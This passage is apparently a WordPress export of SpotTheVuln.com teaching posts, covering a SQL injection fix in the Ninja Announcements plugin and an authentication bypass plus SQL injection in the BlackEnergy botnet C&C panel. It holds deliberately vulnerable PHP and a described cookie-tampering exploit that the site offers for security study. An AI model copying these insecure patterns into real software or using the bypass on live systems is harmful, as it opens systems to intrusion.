		$ninja_annc_end = $ninja_annc_row['enddate'];
		$rightnow = current_time("timestamp");
		
		if($ninja_annc_end != 0){
			$ninja_annc_begindate = date("m/d/Y", $ninja_annc_begin);
			$ninja_annc_begintimehr =  date("g", $ninja_annc_begin);
			$ninja_annc_begintimemin =  date("i", $ninja_annc_begin);
			$ninja_annc_begintimeampm =  date("a", $ninja_annc_begin);
			
			$ninja_annc_enddate = date("m/d/Y", $ninja_annc_end);
			$ninja_annc_endtimehr = date("g", $ninja_annc_end);
			$ninja_annc_endtimemin = date("i", $ninja_annc_end);
			$ninja_annc_endtimeampm = date("a", $ninja_annc_end);
			
		}else{
			$ninja_annc_ignore = 1;
			$ninja_annc_begindate = date("m/d/Y", $rightnow);
			$ninja_annc_enddate = date("m/d/Y", $rightnow);	
		}
		
		//$ninja_annc_begindate = $ninja_annc_begindate.' '.$ninja_annc_begintimehr.':'.$ninja_annc_begintimemin.$ninja_annc_begintimeampm;
		
		//echo $ninja_annc_begindate;
		wp_tiny_mce( false,  // true makes the editor "teeny"
		array(
			"theme_advanced_path" => false
		)
		);
		wp_tiny_mce_preload_dialogs();
		?>
        <div class="wrap">
	<div id="ninja_annc_options_edit" class="icon32"><br></div>
	<h2 id="opener">Edit Announcement - ID: <?php echo $ninja_annc_id;?></h2>
		<form name="" action="" method="post">
		<input type="hidden" name="submitted" value="yes">
		<input type="hidden" name="ninja_annc_id" value="<?php echo $ninja_annc_id;?>">
		Ignore Dates: <input type="checkbox" name="ignoredates" id="ignoredates" value="checked" <?php if($ninja_annc_ignore == 1){ echo "checked";}?>><br>
		Begin Date: <input type="text" class="date" name="begindate" id="begindate" value="<?php echo $ninja_annc_begindate;?>" <?php if($ninja_annc_ignore == 1){ echo "style='background-color: gray' disabled";}?>>
		Time: 
		<select name="begintimehr" id="begintimehr" class="time" <?php if($ninja_annc_ignore == 1){ echo "style='background-color: gray' disabled";}?>>
			<?php
				$x = 1;
				while($x <= 12){
					echo "<option";
					if($x <= 9){
						echo " value = '0$x'";
					}else{
						echo " value = '$x'";
					}
					if($ninja_annc_begintimehr == $x){
						echo " selected";
					}elseif($x == 12 && $ninja_annc_ignore == 1){
						echo " selected";
					}
					echo ">$x</option>";
					$x++;
				}
			
			?>
...snip...
?>
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1471</wp:post_id>
		<wp:post_date>2011-05-30 05:30:41</wp:post_date>
		<wp:post_date_gmt>2011-05-30 12:30:41</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>third</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2102</wp:comment_id>
			<wp:comment_author><![CDATA[PHP, SQL Injection, Wordpress Vulnerability Code Example &laquo; SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/06/third-sql-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-06-03 23:21:05</wp:comment_date>
			<wp:comment_date_gmt>2011-06-04 06:21:05</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...]  [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1307392378.8123";s:7:"message";s:45:"BrettH changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"BrettH";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1307168466.0033";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Third - SQL Injection</title>
		<link>http://spotthevuln.com/2011/06/third-sql-injection/</link>
		<pubDate>Sat, 04 Jun 2011 06:21:00 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1495</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Ninja Announcements

Fixed in Version: 1.3

Issue Type: SQL Injection

Original Code: <a href="http://spotthevuln.com/2011/05/third/">Found Here</a>
<h1>Details</h1>
Lots of potential issues here, but we’ll focus on what was patched.  Here we have a basic SQL injection vulnerability.  The bug is the most simple example of tracing a variable from assignment to usage.  On line 54, the $ninja_annc_id is assigned a value directly from the user/attacker controlled $_REQUEST[‘ninja_annc_id’].  The very next line, the developer uses the tainted $ninja_annc_id to string build a SQL statement.

The developers addressed this issue by moving the dynamic SQL statement to a prepared SQL statement.  Prepared statements are the preferred method for dealing with SQL requests that could potentially contain tainted values.


<h1>Developers Solution</h1>
<code lang="PHP">
<?php
...snip...
	//This if() statement handles user input from the edit section.
	if($_REQUEST['submitted'] == 'yes'){ // BEGIN submit handling if()

		$ninja_annc_id = $_REQUEST['ninja_annc_id'];
	
		$ninja_annc_begindate = $_REQUEST['begindate'];
		$ninja_annc_begintimehr = $_REQUEST['begintimehr'];
		$ninja_annc_begintimemin = $_REQUEST['begintimemin'];
		$ninja_annc_begintimeampm = $_REQUEST['begintimeampm'];
		
		$ninja_annc_enddate = $_REQUEST['enddate'];
		$ninja_annc_endtimehr = $_REQUEST['endtimehr'];
		$ninja_annc_endtimemin = $_REQUEST['endtimemin'];
		$ninja_annc_endtimeampm = $_REQUEST['endtimeampm'];
		
		$ninja_annc_begindate = $ninja_annc_begindate.' '.$ninja_annc_begintimehr.':'.$ninja_annc_begintimemin.$ninja_annc_begintimeampm;
		$ninja_annc_enddate = $ninja_annc_enddate.' '.$ninja_annc_endtimehr.':'.$ninja_annc_endtimemin.$ninja_annc_endtimeampm;
		
		//echo "begin before ".$ninja_annc_begindate;
		//echo "end before ".$ninja_annc_enddate;
		
		$ninja_annc_message = stripslashes($_REQUEST['content']);
		$ninja_annc_active = 1;
		$ninja_annc_location = $_REQUEST['ninja_annc_location'];
		
		$ninja_annc_begindate = strtotime($ninja_annc_begindate);
		$ninja_annc_enddate = strtotime($ninja_annc_enddate);
		
		//echo "begin after ".$ninja_annc_begindate;
		//echo "end after ".$ninja_annc_enddate;
		
		if($_REQUEST['ignoredates'] == "checked"){
			$ninja_annc_begindate = 0;
			$ninja_annc_enddate = 0;
		}
		
		if($_REQUEST['ninja_annc_id'] == 'new'){
			$rows_affected = $wpdb->insert( $ninja_annc_table_name, array( 'begindate' => $ninja_annc_begindate, 'enddate' => $ninja_annc_enddate, 'message' => $ninja_annc_message, 'active' => '0', 'location' => $ninja_annc_location ) );
		}else{
			$wpdb->update( $ninja_annc_table_name, array( 'begindate' => $ninja_annc_begindate, 'enddate' => $ninja_annc_enddate, 'message' => $ninja_annc_message, 'location' => $ninja_annc_location ), array( 'id' => $ninja_annc_id ));
		}
		
		echo "<script language='javascript'>window.location = '".$admin_url."'</script>";
	} // END submit handling if()
	
	//This if...else() statement handles the nuts and bolts of our html output. 
	//Eventually it will be replaced by a switch().
	//Flow goes: Edit Announcement? -> New Announcement? -> Table.
	//This part of our If...else statement creates the editing HTML
	if($_REQUEST['action'] == 'edit') { //BEGIN edit handling if()
		
		$ninja_annc_id = $_REQUEST['ninja_annc_id'];
-		$ninja_annc_row = $wpdb->get_row("SELECT * FROM $ninja_annc_table_name WHERE id = $ninja_annc_id", ARRAY_A);
+		$ninja_annc_row = $wpdb->get_row( 
+		$wpdb->prepare( "SELECT * FROM $ninja_annc_table_name WHERE id = %d", $ninja_annc_id), ARRAY_A);

		$ninja_annc_id = $ninja_annc_row['id'];
		$ninja_annc_location = $ninja_annc_row['location'];
		$ninja_annc_message = stripslashes($ninja_annc_row['message']);
		$ninja_annc_begin = $ninja_annc_row['begindate'];
		$ninja_annc_end = $ninja_annc_row['enddate'];
		$rightnow = current_time("timestamp");
		
		if($ninja_annc_end != 0){
			$ninja_annc_begindate = date("m/d/Y", $ninja_annc_begin);
			$ninja_annc_begintimehr =  date("g", $ninja_annc_begin);
			$ninja_annc_begintimemin =  date("i", $ninja_annc_begin);
			$ninja_annc_begintimeampm =  date("a", $ninja_annc_begin);
			
			$ninja_annc_enddate = date("m/d/Y", $ninja_annc_end);
			$ninja_annc_endtimehr = date("g", $ninja_annc_end);
			$ninja_annc_endtimemin = date("i", $ninja_annc_end);
			$ninja_annc_endtimeampm = date("a", $ninja_annc_end);
			
		}else{
			$ninja_annc_ignore = 1;
			$ninja_annc_begindate = date("m/d/Y", $rightnow);
			$ninja_annc_enddate = date("m/d/Y", $rightnow);	
		}
		
		//$ninja_annc_begindate = $ninja_annc_begindate.' '.$ninja_annc_begintimehr.':'.$ninja_annc_begintimemin.$ninja_annc_begintimeampm;
		
		//echo $ninja_annc_begindate;
		wp_tiny_mce( false,  // true makes the editor "teeny"
		array(
			"theme_advanced_path" => false
		)
		);
		wp_tiny_mce_preload_dialogs();
		?>
        <div class="wrap">
	<div id="ninja_annc_options_edit" class="icon32"><br></div>
	<h2 id="opener">Edit Announcement - ID: <?php echo $ninja_annc_id;?></h2>
		<form name="" action="" method="post">
		<input type="hidden" name="submitted" value="yes">
		<input type="hidden" name="ninja_annc_id" value="<?php echo $ninja_annc_id;?>">
		Ignore Dates: <input type="checkbox" name="ignoredates" id="ignoredates" value="checked" <?php if($ninja_annc_ignore == 1){ echo "checked";}?>><br>
		Begin Date: <input type="text" class="date" name="begindate" id="begindate" value="<?php echo $ninja_annc_begindate;?>" <?php if($ninja_annc_ignore == 1){ echo "style='background-color: gray' disabled";}?>>
		Time: 
		<select name="begintimehr" id="begintimehr" class="time" <?php if($ninja_annc_ignore == 1){ echo "style='background-color: gray' disabled";}?>>
			<?php
				$x = 1;
				while($x <= 12){
					echo "<option";
					if($x <= 9){
						echo " value = '0$x'";
					}else{
						echo " value = '$x'";
					}
					if($ninja_annc_begintimehr == $x){
						echo " selected";
					}elseif($x == 12 && $ninja_annc_ignore == 1){
						echo " selected";
					}
					echo ">$x</option>";
					$x++;
				}
			
			?>
...snip...
?>
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1495</wp:post_id>
		<wp:post_date>2011-06-03 23:21:00</wp:post_date>
		<wp:post_date_gmt>2011-06-04 06:21:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>third-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Rabbit</title>
		<link>http://spotthevuln.com/2011/06/rabbit/</link>
		<pubDate>Tue, 07 Jun 2011 06:19:25 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1503</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Silly rabbit, why you sweatin me?
TuPac Shakur</strong></blockquote>
<code lang="PHP">
<?

	include "common.php";

	$luser = @$_POST['user'];
	$lpass = @$_POST['pass'];
	$login = @$_POST['login'];

	$logined = false;

	if ($login)
	{
    		Sleep(1);
    		if ($luser == $user && $lpass == $pass)
    		{
        		setcookie("logined", $pass);
        		header("location: index.php");
    		}
	} else {
    		$logined = @$_COOKIE['logined'];
    		if ($logined === $pass)
    		{
          		$logined = true;
    		}
	}

?>
<html>
<head>
<STYLE type=text/css>
BODY {
        BACKGROUND: #666666;
        FONT: 11px Verdana, Arial
}
P {
        FONT: 10pt Verdana, Arial;
        COLOR: #000000;
        TEXT-ALIGN: justify
}
TD {
        FONT: 8pt Verdana,Arial;
        COLOR: #000000
}
A {
        COLOR: #000000;
        TEXT-DECORATION: underline
}
A.nav {
        COLOR: #000000; TEXT-DECORATION: none
}
A:hover {
        BACKGROUND: silver; TEXT-DECORATION: underline overline
}
INPUT, SELECT, TEXTAREA {
        FONT-SIZE: 8pt; FONT-FAMILY: Verdana, Helvetica;
        border: 1px solid silver;
        color: #606060;
        background-color: #222222;
        margin-top: 0px;
        margin-bottom: 0px;
}
.HEAD TD {
       BACKGROUND: silver; TEXT-ALIGN: center; FONT-WEIGHT: bold
}
.SLIST TD {
        BACKGROUND: #888888
}
</STYLE>
</head>
<body>

<script>
function wnd( url )
{
        window.open( url, "", "statusbar=no,menubar=no,toolbar=no,scrollbars=yes,resizable=no,width=600,height=400");
}
</script>

<?

    	if (!$logined)
    	{

?>

<form action=index.php method=POST>
<table>
<tr><td>user:</td><td><input type=text name=user></td></tr>
<tr><td>pass:</td><td><input type=password name=pass></td></tr>
<tr><td></td><td><input type=submit name=login value=login></td></tr>
</table>
</form>

<?
        	exit;
	}

	switch (@$_GET['d'])
	{
	case "add":
        	if (empty($_POST['url']))
			break;

        	if (isset($_POST['country'])) $_POST['country'] = strtoupper($_POST['country']);

        	$sql = "INSERT INTO `files`
                	(`url`, `dnum`, `country`)
                	VALUES
                	('{$_POST['url']}', '".intval($_POST['dnum'])."', '{$_POST['country']}')
        	";

        	mysql_query($sql);
        	header ("location: index.php");
        	break;

	case "del":
        	if (!isset($_GET['id']))
            		break;
        
		$sql = "DELETE FROM `files` WHERE `id`='{$_GET['id']}'";
        	mysql_query($sql);
        	header ("location: index.php");
        	break;
	}
	
	if (isset($_POST['opt']))
	{
		if (!isset($_POST['opt']['spoof_ip']))
			$_POST['opt']['spoof_ip'] = 0;

		foreach (array_keys($_POST['opt']) as $k)
			mysql_query("REPLACE INTO `opt` (`name`, `value`) VALUES ('$k', '{$_POST['opt'][$k]}')");

		header("location: index.php");
	}

	$bopt = array();

	$r = mysql_query("SELECT * FROM `opt`");
	while ($f = mysql_fetch_array($r))
		$bopt[$f['name']] = $f['value'];

?>
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1503</wp:post_id>
		<wp:post_date>2011-06-06 23:19:25</wp:post_date>
		<wp:post_date_gmt>2011-06-07 06:19:25</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>rabbit</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2107</wp:comment_id>
			<wp:comment_author><![CDATA[Abraham Kang]]></wp:comment_author>
			<wp:comment_author_email>abraham.kang@owasp.org</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>67.169.124.224</wp:comment_author_IP>
			<wp:comment_date>2011-06-08 19:57:44</wp:comment_date>
			<wp:comment_date_gmt>2011-06-09 02:57:44</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[This one is pretty bad.

1.  Don't like lines 16-20 as it looks like they set the password in a cookie.  On top of this the cookie does not have its secure and httponly flags set so an attacker on a shared medium (wireless network) would be able to sniff the credentials and bypass authentication.

2.  If the Session Identifier is the user's password then an attacker could execute brute force attacks on the application by passing common passwords as the cookie value.  

3.  Having the user's password in a cookie will also expose the user's password to anyone sniffing the wire.  Most users use a common set of passwords and this could lead to the attacker compromising other websites where this user uses the same userId and password.

4.  The problem is further exacerbated by the fact that there is no lock out mechanism so an attacker could make requests all day until he got the non login page and figured out the user's password.

5.  The pass and user input fields do not have their autocomplete="off" attribute set (lines 88-89).  This will allow the browser to cache credentials.

6.  The rest of the page has a truck load of SQL Injection in almost every line of SQL.  Pretty scary as I hope this is not production code.

Regards,
Abe]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1307588264.1144";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1307743821.3048";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2108</wp:comment_id>
			<wp:comment_author><![CDATA[Mafiuss]]></wp:comment_author>
			<wp:comment_author_email>the.mafiuss@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://mafiuss.pastiche.mx</wp:comment_author_url>
			<wp:comment_author_IP>201.103.102.12</wp:comment_author_IP>
			<wp:comment_date>2011-06-08 22:39:19</wp:comment_date>
			<wp:comment_date_gmt>2011-06-09 05:39:19</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[OMG, are you serious??!!]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1307743821.2983";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1307597959.3348";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2110</wp:comment_id>
			<wp:comment_author><![CDATA[PHP, Solution Vulnerability Code Example &laquo; SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/06/rabbit-auth-bypass-and-sqli/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-06-10 15:09:26</wp:comment_date>
			<wp:comment_date_gmt>2011-06-10 22:09:26</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...]  [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1307743821.2903";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1307743766.8532";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Rabbit - Auth Bypass and SQLi</title>
		<link>http://spotthevuln.com/2011/06/rabbit-auth-bypass-and-sqli/</link>
		<pubDate>Fri, 10 Jun 2011 22:09:20 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1506</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: BlackEnergy C&C

Fixed in Version: Not Patched

Issue Type: Authentication Bypass and SQL Injection

Original Code: <a href="http://spotthevuln.com/2011/06/rabbit/">Found Here</a>
<h1>Details</h1>
A couple of interesting bugs here.  As Abe astutely pointed out, pretty much all of the PHP at the end of the code sample is vulnerable to SQL injection.  Veteran Spot the Vuln readers can easily spot the tainted $_POST and $_GET parameters being passed directly into dynamically built SQL statements.  This obviously results in compromise of the backend database and the application.  I’ve highlighted the SQL injection points in the code sample below.  The injection points are fairly obvious.

Now, onto the more interesting bug.  In order to reach the code paths that are vulnerable to SQL injection, we must first “login” to the application.  The “login” routine is contained in lines 11-25.

Later in the code, $logined is checked before allowing the user to reach the vulnerable code paths.  That code can be found on lines 79-96.  So let’s work backwards here.  We see obvious SQL injection bugs in several places, but this code paths can only be reached if the $logined variable is true (line 95).  The value for the $logined variable is controlled by the following else statement:
<code lang="PHP">
else {
    		$logined = @$_COOKIE['logined'];
    		if ($logined === $pass)
    		{
          		$logined = true;
    		}
	}
</code>
Looking at the code above, we see that the application is taking the value for a Cookie named “logined” and assigning that value to variable $logined.  The application then checks to see if $logined is equal to the password for the registered user ($logined === $pass).  If $logined === $pass, then the application sets the $logined value to true.  In this example, the developer missed a critical case.  The client (browser) is free to tamper any part of the HTTP request, including the COOKIE values sent to the application.  All we need to do is issue a HTTP request with a cookie of: logined = true;  <- - any value for the logined cookie will work.
   
If we pass Cookie: logined = true; in our HTTP request, our tainted cookie value will be assigned to the $logined variable.  You can see this in line 20 of the code sample.  Although we will fail the $logined === $pass check, the application fails to clear the $logined variable value so our tainted value remains.  Later in the code, $logined is checked… if it is true the application assumes we are logged in and gives us access to the vulnerable code paths.  We can now exploit the SQL injection vulnerabilities and extract the real $pass value because in order for the comparison to be done, the value must have been stored in cleartext in the database.

There you go, authentication bypass + SQL injection for Blackenergy C&C :)



<h1>Developers Solution</h1>
<code lang="PHP" highlight="109,120,132">
<?

	include "common.php";

	$luser = @$_POST['user'];
	$lpass = @$_POST['pass'];
	$login = @$_POST['login'];

	$logined = false;

	if ($login)
	{
    		Sleep(1);
    		if ($luser == $user && $lpass == $pass)
    		{
        		setcookie("logined", $pass);
        		header("location: index.php");
    		}
	} else {
    		$logined = @$_COOKIE['logined'];
    		if ($logined === $pass)
    		{
          		$logined = true;
    		}
	}

?>
<html>
<head>
<STYLE type=text/css>
BODY {
        BACKGROUND: #666666;
        FONT: 11px Verdana, Arial
}
P {
        FONT: 10pt Verdana, Arial;
        COLOR: #000000;
        TEXT-ALIGN: justify
}
TD {
        FONT: 8pt Verdana,Arial;
        COLOR: #000000
}
A {
        COLOR: #000000;
        TEXT-DECORATION: underline
}
A.nav {
        COLOR: #000000; TEXT-DECORATION: none
}
A:hover {
        BACKGROUND: silver; TEXT-DECORATION: underline overline
}
INPUT, SELECT, TEXTAREA {
        FONT-SIZE: 8pt; FONT-FAMILY: Verdana, Helvetica;
        border: 1px solid silver;
        color: #606060;
        background-color: #222222;
        margin-top: 0px;
        margin-bottom: 0px;
}
.HEAD TD {
       BACKGROUND: silver; TEXT-ALIGN: center; FONT-WEIGHT: bold
}
.SLIST TD {
        BACKGROUND: #888888
}
</STYLE>
</head>
<body>

<script>
function wnd( url )
{
        window.open( url, "", "statusbar=no,menubar=no,toolbar=no,scrollbars=yes,resizable=no,width=600,height=400");
}
</script>

<?

    	if (!$logined)
    	{

?>

<form action=index.php method=POST>
<table>
<tr><td>user:</td><td><input type=text name=user></td></tr>
<tr><td>pass:</td><td><input type=password name=pass></td></tr>
<tr><td></td><td><input type=submit name=login value=login></td></tr>
</table>
</form>

<?
        	exit;
	}

	switch (@$_GET['d'])
	{
	case "add":
        	if (empty($_POST['url']))
			break;

        	if (isset($_POST['country'])) $_POST['country'] = strtoupper($_POST['country']);

        	$sql = "INSERT INTO `files`
                	(`url`, `dnum`, `country`)
                	VALUES
                	('{$_POST['url']}', '".intval($_POST['dnum'])."', '{$_POST['country']}')
        	";

        	mysql_query($sql);
        	header ("location: index.php");
        	break;

	case "del":
        	if (!isset($_GET['id']))
            		break;
        
		$sql = "DELETE FROM `files` WHERE `id`='{$_GET['id']}'";
        	mysql_query($sql);
        	header ("location: index.php");
        	break;
	}
	
	if (isset($_POST['opt']))
	{
		if (!isset($_POST['opt']['spoof_ip']))
			$_POST['opt']['spoof_ip'] = 0;

		foreach (array_keys($_POST['opt']) as $k)
			mysql_query("REPLACE INTO `opt` (`name`, `value`) VALUES ('$k', '{$_POST['opt'][$k]}')");

		header("location: index.php");
	}

	$bopt = array();

	$r = mysql_query("SELECT * FROM `opt`");
	while ($f = mysql_fetch_array($r))
		$bopt[$f['name']] = $f['value'];

?>
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1506</wp:post_id>
		<wp:post_date>2011-06-10 15:09:20</wp:post_date>
		<wp:post_date_gmt>2011-06-10 22:09:20</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>rabbit-auth-bypass-and-sqli</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
